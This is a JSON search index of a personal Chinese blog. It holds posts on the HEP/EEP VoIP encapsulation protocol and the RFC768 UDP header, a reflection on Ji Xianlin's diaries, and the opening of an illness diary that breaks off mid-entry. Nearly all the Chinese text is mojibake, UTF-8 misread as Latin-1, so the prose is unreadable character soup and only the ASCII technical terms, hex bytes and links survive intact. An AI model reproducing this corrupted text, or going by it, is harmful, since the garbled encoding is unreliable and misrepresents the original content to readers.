[{"content":"HEPç®€ä»‹ HEPåè®®ç›®å‰å«åšEEP(Extensible Encapsulation Protocol), é‚£ä¹‹å‰çš„ç¼©å†™HEPçš„Hï¼Œæˆ‘åªèƒ½æ¨æµ‹ä¸ºhomerã€‚\nè¿™ä¸ªåè®®çš„ä¸»è¦åŠŸèƒ½æ˜¯å¯¹VoIPè¿è·¯ä¸Šçš„æ•°æ®åŒ…ï¼Œä¾‹å¦‚SIPè¿›è¡Œå°è£…ï¼Œæ–¹ä¾¿åç»­åˆ†æSIPä¿¡ä»¤å›¾ã€‚\nç›®å‰è¿™ä¸ªåè®®å·²ç»å‡çº§åˆ°V3ç‰ˆæœ¬ï¼Œåœ¨è¿™ä¸ªpdfHEP3_Network_Protocol_Specification_REV_36ä¸­æœ‰è¯¦ç»†çš„ä»‹ç»ã€‚\nä»Šå¤©æˆ‘ä»¬ä¸»è¦çœ‹è¿™ä¸ªåè®®çš„V3ç‰ˆæœ¬çš„åè®®æ˜¯å¦‚ä½•å®ç°çš„ã€‚\nåŒ…å¤´ packet-beta title HEP Packet 0-3: \u0026#34;ç‰ˆæœ¬å·\u0026#34; 4-5: \u0026#34;æ€»é•¿åº¦\u0026#34; 6-15: \u0026#34;æ•°æ®æ®µ(å˜é•¿)\u0026#34; HEPv3çš„åŒ…å¤´æ˜¯6ä¸ªå­—èŠ‚ï¼Œä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†\nç‰ˆæœ¬å·ï¼šå›ºå®š4ä¸ªå­—èŠ‚é•¿åº¦ï¼Œæ˜¯HEP3 æ€»é•¿åº¦ï¼šå›ºå®š2ä¸ªå­—èŠ‚é•¿åº¦ï¼Œæ˜¯åŒ…çš„æ€»é•¿åº¦ï¼Œè¿™ä¸ªæ€»é•¿åº¦åŒ…æ‹¬äº†åŒ…å¤´çš„å…­ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥HEPåŒ…çš„å¤§å°èŒƒå›´ä¸€èˆ¬æ˜¯6-65535ä¹‹é—´ã€‚ æ•°æ®æ®µï¼šæ•°æ®æ®µçš„é•¿åº¦ä¸å›ºå®š æ³¨æ„äº‹é¡¹ï¼šå‡å¦‚ä»ä¼ è¾“å±‚è¯»åˆ°1000ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œåœ¨è§£æå‰6ä¸ªå­—èŠ‚æ˜¯ï¼Œå‘ç°æ€»é•¿åº¦(total length)çš„å­æ®µæ˜¯1200ï¼Œé‚£å°±è¯´æ˜æœ¬æ¬¡è¯»åˆ°çš„æ•°æ®è¿˜ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„\næ•°æ®æ®µè§£æ æ•°æ®æ®µç”±å›ºå®š6å­—èŠ‚é•¿åº¦çš„å¤´éƒ¨å’Œå˜é•¿çš„payloadéƒ¨åˆ†ã€‚\npacket-beta title HEP Packet 0-1: \u0026#34;vendor ID\u0026#34; 2-3: \u0026#34;type ID\u0026#34; 4-5: \u0026#34;length\u0026#34; 6-15: \u0026#34;payload\u0026#34; vendor ID: å›ºå®š2å­—èŠ‚é•¿åº¦, å…¶å®æ„ä¹‰ä¸å¤§ï¼Œ type ID: å›ºå®š2å­—èŠ‚é•¿åº¦ï¼Œè¿™ä¸ªå­æ®µå¾ˆé‡è¦ï¼Œå†³å®šäº†payloadçš„ç±»å‹ã€‚å¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªå¯¹è±¡çš„key, ç„¶åæŠŠpayloadç†è§£ä¸ºvalue length: å›ºå®š2å­—èŠ‚é•¿åº¦ï¼ŒèŒƒå›´æ˜¯0-65535ï¼Œè¿™ä¸ªå­—æ®µæ˜¯ä¹Ÿæ˜¯æ•´ä¸ªæ•°æ®æ®µçš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯åŒ…æ‹¬äº†6ä¸ªå­—èŠ‚çš„æ®µå¤´ payload: é•¿åº¦æ˜¯lengthçš„é•¿åº¦-6ï¼Œè¡¨ç¤ºæ•°æ®é•¿åº¦ hepåè®®æœ‰ä¸ªtype IDçš„æ˜ å°„è¡¨\nchunk type ID ç±»å‹ æè¿° 0x0001 uint8 IPç±»å‹ï¼Œ0x02=IPv4, 0x0a=IPv6 0x0002 uint8 åè®®ç±»å‹ 0x06=TCP, 0x11=UDPï¼Œ å¯ä»¥å‚è€ƒIPåè®®å·åˆ—è¡¨ å…¶ä»–çš„å­—æ®µè¿˜æœ‰å¾ˆå¤šï¼Œå¯ä»¥å‚è€ƒHEP3_Network_Protocol_Specification_REV_36\nHEP3ä¾‹å­åˆ†æ 48 45 50 33 00 71 H E P 3 len=113 00 00 00 01 00 07 02 ä¸é‡è¦ IPç±»å‹ é•¿åº¦ä¸º7, å‡å»6å­—èŠ‚çš„å¤´ï¼Œpayloadé•¿åº¦ä¸º1å­—èŠ‚, ä¹Ÿå°±æ˜¯0x02, å€¼ä¸º2ï¼Œè¡¨ç¤ºIPç”¨çš„æ˜¯IPv4 00 00 00 02 00 07 11 procotol ID = 17 (UDP) å…³äº 00 00 00 01 00 07 02ï¼Œ 02ä¸ºä»€ä¹ˆä»£è¡¨IPv4, å…³äºè¿™ä¸ªé—®é¢˜ï¼Œåˆšå¼€å§‹æˆ‘ä¹Ÿä¸æ¸…æ¥šï¼Œè€Œä¸”è¿˜æœ‰ä¸ªäººæå‡ºissue https://github.com/sipcapture/HEP/issues/6\næŒ‰ç…§ Address Family Numbersï¼Œ IPv4å¯¹åº”çš„å·ç å…¶å®æ˜¯1ï¼Œä½†æ˜¯hepåè®®çš„ä½œè€…ä¸ºä»€ä¹ˆå®šä¹‰ä¸º1ï¼Œæˆ‘è§‰å¾—è¿™ä¸ªå¯èƒ½å’ŒINNAå¹¶æ²¡æœ‰ä»€ä¹ˆå…³ç³»ã€‚ IPv4æ˜¯2ï¼Œé‚£ä¹ˆIPv6æ˜¯å¤šå°‘ï¼Œè§„èŒƒé‡Œä¹Ÿæ²¡æœ‰è¯´æ˜ï¼Œåªèƒ½ä»ä¸€äº›ä»£ç é‡Œçœ‹å‡ºIPv6çš„å·ç æ˜¯0x0a, ä¹Ÿå°±æ˜¯10.\n// HEP chuncks const ( Version = 1 // Chunk 0x0001 IP protocol family (0x02=IPv4, 0x0a=IPv6) å‚è€ƒæ–‡æ¡£ https://github.com/sipcapture/homer/wiki https://github.com/sipcapture/HEP/issues/6 https://github.com/sipcapture/HEP https://github.com/sipcapture/HEP/blob/master/docs/HEP3_Network_Protocol_Specification_REV_36.pdf https://github.com/sipcapture/heplify/blob/master/decoder/decoder.go https://zh.wikipedia.org/wiki/IP%E5%8D%8F%E8%AE%AE%E5%8F%B7%E5%88%97%E8%A1%A8 ","permalink":"https://wdd.js.org/posts/2025/hep-protocol/","summary":"HEPç®€ä»‹ HEPåè®®ç›®å‰å«åšEEP(Extensible Encapsulation Protocol), é‚£ä¹‹å‰çš„ç¼©å†™HEPçš„Hï¼Œæˆ‘åªèƒ½æ¨æµ‹ä¸ºhomerã€‚\nè¿™ä¸ªåè®®çš„ä¸»è¦åŠŸèƒ½æ˜¯å¯¹VoIPè¿è·¯ä¸Šçš„æ•°æ®åŒ…ï¼Œä¾‹å¦‚SIPè¿›è¡Œå°è£…ï¼Œæ–¹ä¾¿åç»­åˆ†æSIPä¿¡ä»¤å›¾ã€‚\nç›®å‰è¿™ä¸ªåè®®å·²ç»å‡çº§åˆ°V3ç‰ˆæœ¬ï¼Œåœ¨è¿™ä¸ªpdfHEP3_Network_Protocol_Specification_REV_36ä¸­æœ‰è¯¦ç»†çš„ä»‹ç»ã€‚\nä»Šå¤©æˆ‘ä»¬ä¸»è¦çœ‹è¿™ä¸ªåè®®çš„V3ç‰ˆæœ¬çš„åè®®æ˜¯å¦‚ä½•å®ç°çš„ã€‚\nåŒ…å¤´ packet-beta title HEP Packet 0-3: \u0026#34;ç‰ˆæœ¬å·\u0026#34; 4-5: \u0026#34;æ€»é•¿åº¦\u0026#34; 6-15: \u0026#34;æ•°æ®æ®µ(å˜é•¿)\u0026#34; HEPv3çš„åŒ…å¤´æ˜¯6ä¸ªå­—èŠ‚ï¼Œä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†\nç‰ˆæœ¬å·ï¼šå›ºå®š4ä¸ªå­—èŠ‚é•¿åº¦ï¼Œæ˜¯HEP3 æ€»é•¿åº¦ï¼šå›ºå®š2ä¸ªå­—èŠ‚é•¿åº¦ï¼Œæ˜¯åŒ…çš„æ€»é•¿åº¦ï¼Œè¿™ä¸ªæ€»é•¿åº¦åŒ…æ‹¬äº†åŒ…å¤´çš„å…­ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥HEPåŒ…çš„å¤§å°èŒƒå›´ä¸€èˆ¬æ˜¯6-65535ä¹‹é—´ã€‚ æ•°æ®æ®µï¼šæ•°æ®æ®µçš„é•¿åº¦ä¸å›ºå®š æ³¨æ„äº‹é¡¹ï¼šå‡å¦‚ä»ä¼ è¾“å±‚è¯»åˆ°1000ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œåœ¨è§£æå‰6ä¸ªå­—èŠ‚æ˜¯ï¼Œå‘ç°æ€»é•¿åº¦(total length)çš„å­æ®µæ˜¯1200ï¼Œé‚£å°±è¯´æ˜æœ¬æ¬¡è¯»åˆ°çš„æ•°æ®è¿˜ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„\næ•°æ®æ®µè§£æ æ•°æ®æ®µç”±å›ºå®š6å­—èŠ‚é•¿åº¦çš„å¤´éƒ¨å’Œå˜é•¿çš„payloadéƒ¨åˆ†ã€‚\npacket-beta title HEP Packet 0-1: \u0026#34;vendor ID\u0026#34; 2-3: \u0026#34;type ID\u0026#34; 4-5: \u0026#34;length\u0026#34; 6-15: \u0026#34;payload\u0026#34; vendor ID: å›ºå®š2å­—èŠ‚é•¿åº¦, å…¶å®æ„ä¹‰ä¸å¤§ï¼Œ type ID: å›ºå®š2å­—èŠ‚é•¿åº¦ï¼Œè¿™ä¸ªå­æ®µå¾ˆé‡è¦ï¼Œå†³å®šäº†payloadçš„ç±»å‹ã€‚å¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªå¯¹è±¡çš„key, ç„¶åæŠŠpayloadç†è§£ä¸ºvalue length: å›ºå®š2å­—èŠ‚é•¿åº¦ï¼ŒèŒƒå›´æ˜¯0-65535ï¼Œè¿™ä¸ªå­—æ®µæ˜¯ä¹Ÿæ˜¯æ•´ä¸ªæ•°æ®æ®µçš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯åŒ…æ‹¬äº†6ä¸ªå­—èŠ‚çš„æ®µå¤´ payload: é•¿åº¦æ˜¯lengthçš„é•¿åº¦-6ï¼Œè¡¨ç¤ºæ•°æ®é•¿åº¦ hepåè®®æœ‰ä¸ªtype IDçš„æ˜ å°„è¡¨\nchunk type ID ç±»å‹ æè¿° 0x0001 uint8 IPç±»å‹ï¼Œ0x02=IPv4, 0x0a=IPv6 0x0002 uint8 åè®®ç±»å‹ 0x06=TCP, 0x11=UDPï¼Œ å¯ä»¥å‚è€ƒIPåè®®å·åˆ—è¡¨ å…¶ä»–çš„å­—æ®µè¿˜æœ‰å¾ˆå¤šï¼Œå¯ä»¥å‚è€ƒHEP3_Network_Protocol_Specification_REV_36","title":"HEP åè®®å­¦ä¹ ç¬”è®°"},{"content":"åœ¨ç”µå½±ã€Šé‚ªä¸å‹æ­£ã€‹ä¸­ï¼Œå…³äºå†™æ—¥è®°çš„ç»å…¸å¯¹ç™½æ˜¯\n\u0026#34;æ­£ç»äººè°å†™æ—¥è®°å•Šï¼Ÿ\u0026#34; \u0026#34;æ˜¯å•Š\u0026#34; \u0026#34;ä½ å†™æ—¥è®°å—ï¼Ÿ\u0026#34; \u0026#34;æˆ‘ä¸å†™ã€‚ä½ å†™æ—¥è®°å—ï¼Ÿ\u0026#34; \u0026#34;è°èƒ½æŠŠå¿ƒé‡Œè¯å†™æ—¥è®°é‡Œï¼Ÿ\u0026#34; \u0026#34;å†™å‡ºæ¥çš„é‚£èƒ½å«å¿ƒé‡Œè¯ï¼Ÿ\u0026#34; \u0026#34;ä¸‹è´±ï¼\u0026#34; ç»™æˆ‘çŒè¾“ä¸€ç§æ„Ÿè§‰å†™æ—¥è®°çš„äººå¾€å¾€æ˜¯è™šä¼ªçš„ã€‚\nç„¶è€Œï¼Œæœ€è¿‘æˆ‘çœ‹äº†å­£ç¾¡æ—å…ˆç”Ÿä¸¤æœ¬ä¹¦ã€Šç‰›æ£šæ‚å¿†ã€‹å’Œã€Šç•™å¾—åå¹´ã€‹ï¼Œæˆ‘ä¸å¾—ä¸å¯¹å­£å…ˆç”Ÿä½©æœçš„äº”ä½“æŠ•åœ°ï¼Œçœ¼è§’æœ¦èƒ§ï¼Œé¼»å¤´å‘é…¸ã€‚\næˆ‘åœ¨å¾·å›½åå¹´çš„æ—¥è®°ï¼Œä¸€å¤©ä¸ç¼ºï¼Œææ€•æœ‰ä¸€ä¸¤ç™¾ä¸‡å­—ã€‚\u0026ndash;ã€Šç•™å¾·åå¹´ã€‹\nåšä¸€ä»¶å°äº‹ï¼ŒåšæŒ10å¹´ã€‚ è¿™æ˜¯ä»€ä¹ˆæ ·åŠ¨æœºï¼Œæ˜¯å› ä¸ºæ¯…åŠ›å—ï¼Ÿ\nå¦‚æœè¯´åšä¸€ä»¶äº‹è®©è‡ªå·±æ„Ÿè§‰å¾ˆéš¾ï¼Œä¸æƒ³åšï¼Œä½†æ˜¯åšäº†å¾ˆé•¿æ—¶é—´ï¼Œå¯ä»¥ç§°ä¹‹ä¸ºæ¯…åŠ›ã€‚\næˆ‘è§‰å¾—é™¤äº†æ¯…åŠ›ï¼Œæ›´å¤šçš„ä¸€ç§å–œæ¬¢ï¼Œä¸€ç§ä¹ æƒ¯ã€‚ä¸€ç§æŠŠæ€æƒ³è‡ªç„¶æµéœ²æŒ‡å°–ï¼Œè½ç¬”æˆæ–‡çš„è‡ªç„¶å¤©æ€§ã€‚\næˆ‘ä¸è®°å¾—ä»¥å‰ä¸Šå­¦æ—¶ï¼Œæœ‰æ²¡æœ‰åº¦è¿‡å­£å…ˆç”Ÿçš„ã€‚ç„¶è€Œå­£å…ˆç”Ÿçš„å¤§åï¼Œè¿˜æ˜¯ç•¥æœ‰è€³é—»çš„ã€‚\nä½†æ˜¯é™¤äº†å­£å…ˆç”Ÿçš„å¤§åçš„ï¼Œå…¶ä»–çš„äº‹æƒ…ï¼Œå‡ ä¹ä¸äº†è§£ã€‚\nçœ‹äº†ä¸¤æœ¬ä¹¦ä¹¦åï¼Œæˆ‘ä¸ç¦å¯¹å­£å…ˆç”Ÿç”Ÿæœ‰æœ‰ä¸€ç§å¿ƒé©°ç¥å¾€ã€‚\næˆ‘ä¸çŸ¥é“å­£å…ˆç”ŸåŸæ¥æ˜¯æ¸…æœæœ«å¹´çš„äººã€‚ç»å†è¿‡æ¸…æœ«ã€æ°‘å›½ã€äºŒæˆ˜ã€è§£æ”¾ã€æ–‡åŒ–å¤§é©å‘½\u0026hellip;\næˆ‘ä¸çŸ¥é“å­£å…ˆç”ŸåŸæ¥å»å¾·å›½ç•™è¿‡å­¦ï¼Œè€Œä¸”æ˜¯æ˜¯åç«è½¦å»çš„ã€‚ å¾·å›½å“¥å»·æ ¹çš„é£æ™¯æå†™ï¼Œè®©æˆ‘è„‘æµ·é‡Œå‘ˆç°ä¸€ç§å®«å´éªåŠ¨ç”»èˆ¬ç”»é¢ã€‚\næˆ‘ä¸çŸ¥é“åŸæ¥å­£å…ˆç”Ÿåœ¨å¾·å›½è¿˜ç»å†è¿‡äºŒæˆ˜ã€‚\næˆ‘ä¸çŸ¥é“å­£å…ˆç”ŸåŸæ¥è¿˜åœ¨æ–‡åŒ–å¤§é©å‘½ä¸­ï¼Œæ•°æ¬¡è¢«æ‰“å€’ã€‚\nå­£å…ˆç”Ÿçš„æ–‡é£æœ´å®ï¼Œæ„Ÿæƒ…è‡ªç„¶æµéœ²ã€‚ä½ èƒ½ä»ä»–çš„æ–‡å­—ä¸­çœ‹åˆ°ä¸€ä¸ªæ™®é€šäººæ‡¦å¼±ä¸å‹‡æ°”ã€è¿·èŒ«ä¸åšæŒã€æ¬²æœ›å’Œå…‹åˆ¶ã€‚\næˆ‘å–œæ¬¢å­£å…ˆç”Ÿçš„æ–‡é£ï¼Œä¹Ÿå–œæ¬¢å­£å…ˆç”Ÿçš„ä¸ºäººã€‚\næˆ‘è§‰å¾—ï¼Œå½’æ ¹ç»“åº•ï¼Œæˆ‘å–œæ¬¢çœŸå®ï¼ŒåŒæ¶ç²‰é¥°ã€‚\n","permalink":"https://wdd.js.org/posts/2025/jixianlin-book/","summary":"åœ¨ç”µå½±ã€Šé‚ªä¸å‹æ­£ã€‹ä¸­ï¼Œå…³äºå†™æ—¥è®°çš„ç»å…¸å¯¹ç™½æ˜¯\n\u0026#34;æ­£ç»äººè°å†™æ—¥è®°å•Šï¼Ÿ\u0026#34; \u0026#34;æ˜¯å•Š\u0026#34; \u0026#34;ä½ å†™æ—¥è®°å—ï¼Ÿ\u0026#34; \u0026#34;æˆ‘ä¸å†™ã€‚ä½ å†™æ—¥è®°å—ï¼Ÿ\u0026#34; \u0026#34;è°èƒ½æŠŠå¿ƒé‡Œè¯å†™æ—¥è®°é‡Œï¼Ÿ\u0026#34; \u0026#34;å†™å‡ºæ¥çš„é‚£èƒ½å«å¿ƒé‡Œè¯ï¼Ÿ\u0026#34; \u0026#34;ä¸‹è´±ï¼\u0026#34; ç»™æˆ‘çŒè¾“ä¸€ç§æ„Ÿè§‰å†™æ—¥è®°çš„äººå¾€å¾€æ˜¯è™šä¼ªçš„ã€‚\nç„¶è€Œï¼Œæœ€è¿‘æˆ‘çœ‹äº†å­£ç¾¡æ—å…ˆç”Ÿä¸¤æœ¬ä¹¦ã€Šç‰›æ£šæ‚å¿†ã€‹å’Œã€Šç•™å¾—åå¹´ã€‹ï¼Œæˆ‘ä¸å¾—ä¸å¯¹å­£å…ˆç”Ÿä½©æœçš„äº”ä½“æŠ•åœ°ï¼Œçœ¼è§’æœ¦èƒ§ï¼Œé¼»å¤´å‘é…¸ã€‚\næˆ‘åœ¨å¾·å›½åå¹´çš„æ—¥è®°ï¼Œä¸€å¤©ä¸ç¼ºï¼Œææ€•æœ‰ä¸€ä¸¤ç™¾ä¸‡å­—ã€‚\u0026ndash;ã€Šç•™å¾·åå¹´ã€‹\nåšä¸€ä»¶å°äº‹ï¼ŒåšæŒ10å¹´ã€‚ è¿™æ˜¯ä»€ä¹ˆæ ·åŠ¨æœºï¼Œæ˜¯å› ä¸ºæ¯…åŠ›å—ï¼Ÿ\nå¦‚æœè¯´åšä¸€ä»¶äº‹è®©è‡ªå·±æ„Ÿè§‰å¾ˆéš¾ï¼Œä¸æƒ³åšï¼Œä½†æ˜¯åšäº†å¾ˆé•¿æ—¶é—´ï¼Œå¯ä»¥ç§°ä¹‹ä¸ºæ¯…åŠ›ã€‚\næˆ‘è§‰å¾—é™¤äº†æ¯…åŠ›ï¼Œæ›´å¤šçš„ä¸€ç§å–œæ¬¢ï¼Œä¸€ç§ä¹ æƒ¯ã€‚ä¸€ç§æŠŠæ€æƒ³è‡ªç„¶æµéœ²æŒ‡å°–ï¼Œè½ç¬”æˆæ–‡çš„è‡ªç„¶å¤©æ€§ã€‚\næˆ‘ä¸è®°å¾—ä»¥å‰ä¸Šå­¦æ—¶ï¼Œæœ‰æ²¡æœ‰åº¦è¿‡å­£å…ˆç”Ÿçš„ã€‚ç„¶è€Œå­£å…ˆç”Ÿçš„å¤§åï¼Œè¿˜æ˜¯ç•¥æœ‰è€³é—»çš„ã€‚\nä½†æ˜¯é™¤äº†å­£å…ˆç”Ÿçš„å¤§åçš„ï¼Œå…¶ä»–çš„äº‹æƒ…ï¼Œå‡ ä¹ä¸äº†è§£ã€‚\nçœ‹äº†ä¸¤æœ¬ä¹¦ä¹¦åï¼Œæˆ‘ä¸ç¦å¯¹å­£å…ˆç”Ÿç”Ÿæœ‰æœ‰ä¸€ç§å¿ƒé©°ç¥å¾€ã€‚\næˆ‘ä¸çŸ¥é“å­£å…ˆç”ŸåŸæ¥æ˜¯æ¸…æœæœ«å¹´çš„äººã€‚ç»å†è¿‡æ¸…æœ«ã€æ°‘å›½ã€äºŒæˆ˜ã€è§£æ”¾ã€æ–‡åŒ–å¤§é©å‘½\u0026hellip;\næˆ‘ä¸çŸ¥é“å­£å…ˆç”ŸåŸæ¥å»å¾·å›½ç•™è¿‡å­¦ï¼Œè€Œä¸”æ˜¯æ˜¯åç«è½¦å»çš„ã€‚ å¾·å›½å“¥å»·æ ¹çš„é£æ™¯æå†™ï¼Œè®©æˆ‘è„‘æµ·é‡Œå‘ˆç°ä¸€ç§å®«å´éªåŠ¨ç”»èˆ¬ç”»é¢ã€‚\næˆ‘ä¸çŸ¥é“åŸæ¥å­£å…ˆç”Ÿåœ¨å¾·å›½è¿˜ç»å†è¿‡äºŒæˆ˜ã€‚\næˆ‘ä¸çŸ¥é“å­£å…ˆç”ŸåŸæ¥è¿˜åœ¨æ–‡åŒ–å¤§é©å‘½ä¸­ï¼Œæ•°æ¬¡è¢«æ‰“å€’ã€‚\nå­£å…ˆç”Ÿçš„æ–‡é£æœ´å®ï¼Œæ„Ÿæƒ…è‡ªç„¶æµéœ²ã€‚ä½ èƒ½ä»ä»–çš„æ–‡å­—ä¸­çœ‹åˆ°ä¸€ä¸ªæ™®é€šäººæ‡¦å¼±ä¸å‹‡æ°”ã€è¿·èŒ«ä¸åšæŒã€æ¬²æœ›å’Œå…‹åˆ¶ã€‚\næˆ‘å–œæ¬¢å­£å…ˆç”Ÿçš„æ–‡é£ï¼Œä¹Ÿå–œæ¬¢å­£å…ˆç”Ÿçš„ä¸ºäººã€‚\næˆ‘è§‰å¾—ï¼Œå½’æ ¹ç»“åº•ï¼Œæˆ‘å–œæ¬¢çœŸå®ï¼ŒåŒæ¶ç²‰é¥°ã€‚","title":"å†™æ—¥è®°çš„æ­£ç»äºº - å­£ç¾¡æ—"},{"content":"åŒ…æ ¼å¼ UDPåŒ…å¤´å·¥å ç”¨8ä¸ªå­—èŠ‚, å…¶ä¸­æºç«¯å£å’Œç›®æ ‡ç«¯å£å„å 2ä¸ªå­—èŠ‚ï¼Œé•¿åº¦å 2ä¸ªå­—èŠ‚ï¼Œæ ¡éªŒå’Œå 2ä¸ªå­—èŠ‚ã€‚\n0 7 8 15 16 23 24 31 +--------+--------+--------+--------+ | Source | Destination | | Port | Port | +--------+--------+--------+--------+ | | | | Length | Checksum | +--------+--------+--------+--------+ | | data octets ... +---------------- ... User Datagram Header Format å­—æ®µ æºç«¯å£ï¼Œå¯é€‰å­—æ®µï¼Œé»˜è®¤ä¸º0ï¼Œå¦‚æœæ˜¯æœ‰æ„ä¹‰çš„å…¶ä»–ç«¯å£ï¼Œè¡¨ç¤ºåç»­å“åº”å¯ä»¥é€å›åˆ°è¯¥ç«¯å£ ç›®æ ‡ç«¯å£ï¼Œå¿…é¡»å­—æ®µï¼Œç”¨æ¥å…³è”ç›®æ ‡ä¸»æœºä¸Šè¿›ç¨‹ç›‘å¬çš„ç«¯å£ é•¿åº¦ï¼Œé•¿åº¦æ˜¯æ•´ä¸ªUDPåŒ…çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯åŒ…å¤´ + åŒ…çš„æ•°æ®ï¼ŒåŒ…å¤´å›ºå®š8å­—èŠ‚ï¼Œé‚£ä¹ˆlengthçš„æœ€å°é•¿åº¦å°±æ˜¯8 æ ¡éªŒå’Œï¼Œç”¨æ¥éªŒè¯ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦å‘ç”Ÿäº†é”™è¯¯ã€‚æ ¡éªŒå’Œçš„è®¡ç®—ç»“æœä¸æºIPã€ç›®æ ‡IPã€UDPçš„åŒ…é•¿æœ‰å…³ã€‚ å¦‚æœæ ¡éªŒå’Œå¤±è´¥ï¼Œé‚£ä¹ˆæ¶ˆæ¯ä¼šè¢«ä¸¢å¼ƒã€‚ æœ‰äº›æ ¡éªŒå’Œè®¡ç®—çš„å·¥ä½œä¼šè¢«æ”¾ç½®åœ¨ç½‘å¡ä¸Šï¼Œä»è€Œå‡å°‘CPUçš„è´Ÿè½½ã€‚å½“ç„¶å¦‚æœåœ¨ç½‘å¡ä¸Šå› ä¸ºæ ¡éªŒå’Œçš„é—®é¢˜è¢«ç½‘å¡ä¸¢å¼ƒï¼Œä¸Šå±‚åº”ç”¨æ˜¯æ”¶ä¸åˆ°ä¸åˆ°UDPåŒ…çš„ã€‚ä½†æ˜¯ç”¨tcpdumpå¯ä»¥æŠ“åˆ°è¿™ç§æ ¡éªŒå’Œæœ‰é—®é¢˜çš„åŒ…ã€‚ æ€è€ƒ1ï¼š ä¸ºä»€ä¹ˆæºç«¯å£å¯ä»¥è®¾ç½®ä¸º0ï¼Ÿ\nç­”ï¼šæœ‰äº›UDPåŒ…ï¼Œæ˜¯ä¸éœ€è¦å“åº”çš„ï¼Œåªéœ€è¦å‘é€å‡ºæ¶ˆæ¯ã€‚\nå‚è€ƒ https://datatracker.ietf.org/doc/html/rfc768 https://wdd.js.org/opensips/ch7/big-udp-msg/ https://wdd.js.org/network/udp-checksum-offload/ ","permalink":"https://wdd.js.org/network/rfc768-udp/","summary":"åŒ…æ ¼å¼ UDPåŒ…å¤´å·¥å ç”¨8ä¸ªå­—èŠ‚, å…¶ä¸­æºç«¯å£å’Œç›®æ ‡ç«¯å£å„å 2ä¸ªå­—èŠ‚ï¼Œé•¿åº¦å 2ä¸ªå­—èŠ‚ï¼Œæ ¡éªŒå’Œå 2ä¸ªå­—èŠ‚ã€‚\n0 7 8 15 16 23 24 31 +--------+--------+--------+--------+ | Source | Destination | | Port | Port | +--------+--------+--------+--------+ | | | | Length | Checksum | +--------+--------+--------+--------+ | | data octets ... +---------------- ... User Datagram Header Format å­—æ®µ æºç«¯å£ï¼Œå¯é€‰å­—æ®µï¼Œé»˜è®¤ä¸º0ï¼Œå¦‚æœæ˜¯æœ‰æ„ä¹‰çš„å…¶ä»–ç«¯å£ï¼Œè¡¨ç¤ºåç»­å“åº”å¯ä»¥é€å›åˆ°è¯¥ç«¯å£ ç›®æ ‡ç«¯å£ï¼Œå¿…é¡»å­—æ®µï¼Œç”¨æ¥å…³è”ç›®æ ‡ä¸»æœºä¸Šè¿›ç¨‹ç›‘å¬çš„ç«¯å£ é•¿åº¦ï¼Œé•¿åº¦æ˜¯æ•´ä¸ªUDPåŒ…çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯åŒ…å¤´ + åŒ…çš„æ•°æ®ï¼ŒåŒ…å¤´å›ºå®š8å­—èŠ‚ï¼Œé‚£ä¹ˆlengthçš„æœ€å°é•¿åº¦å°±æ˜¯8 æ ¡éªŒå’Œï¼Œç”¨æ¥éªŒè¯ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦å‘ç”Ÿäº†é”™è¯¯ã€‚æ ¡éªŒå’Œçš„è®¡ç®—ç»“æœä¸æºIPã€ç›®æ ‡IPã€UDPçš„åŒ…é•¿æœ‰å…³ã€‚ å¦‚æœæ ¡éªŒå’Œå¤±è´¥ï¼Œé‚£ä¹ˆæ¶ˆæ¯ä¼šè¢«ä¸¢å¼ƒã€‚ æœ‰äº›æ ¡éªŒå’Œè®¡ç®—çš„å·¥ä½œä¼šè¢«æ”¾ç½®åœ¨ç½‘å¡ä¸Šï¼Œä»è€Œå‡å°‘CPUçš„è´Ÿè½½ã€‚å½“ç„¶å¦‚æœåœ¨ç½‘å¡ä¸Šå› ä¸ºæ ¡éªŒå’Œçš„é—®é¢˜è¢«ç½‘å¡ä¸¢å¼ƒï¼Œä¸Šå±‚åº”ç”¨æ˜¯æ”¶ä¸åˆ°ä¸åˆ°UDPåŒ…çš„ã€‚ä½†æ˜¯ç”¨tcpdumpå¯ä»¥æŠ“åˆ°è¿™ç§æ ¡éªŒå’Œæœ‰é—®é¢˜çš„åŒ…ã€‚ æ€è€ƒ1ï¼š ä¸ºä»€ä¹ˆæºç«¯å£å¯ä»¥è®¾ç½®ä¸º0ï¼Ÿ\nç­”ï¼šæœ‰äº›UDPåŒ…ï¼Œæ˜¯ä¸éœ€è¦å“åº”çš„ï¼Œåªéœ€è¦å‘é€å‡ºæ¶ˆæ¯ã€‚\nå‚è€ƒ https://datatracker.ietf.org/doc/html/rfc768 https://wdd.js.org/opensips/ch7/big-udp-msg/ https://wdd.js.org/network/udp-checksum-offload/ ","title":"RFC768 UDPåŒ…å­¦ä¹ ç¬”è®°"},{"content":"28å· - æŠ—ä½“ 28å·æ™šä¸Šï¼Œæˆ‘è§‰å¾—å—“å­æœ‰ç‚¹åˆºç—›ã€‚å› ä¸ºå‰ä¸¤å‘¨å‘è¿‡ä¸€æ¬¡çƒ§ï¼Œæˆ‘è§‰å¾—è¿™æ¬¡å—“å­ç—›åº”è¯¥ä¸ä¼šæ˜¯å‘çƒ§çš„å‰å¥äº†ï¼Œæ¯•ç«Ÿèº«ä½“æ˜¯æœ‰æŠ—ä½“çš„ã€‚\næˆ‘é«˜ä¼°äº†ä¹‹å‰äº§ç”Ÿçš„æŠ—ä½“ã€‚\n29å· - æ¢¦ 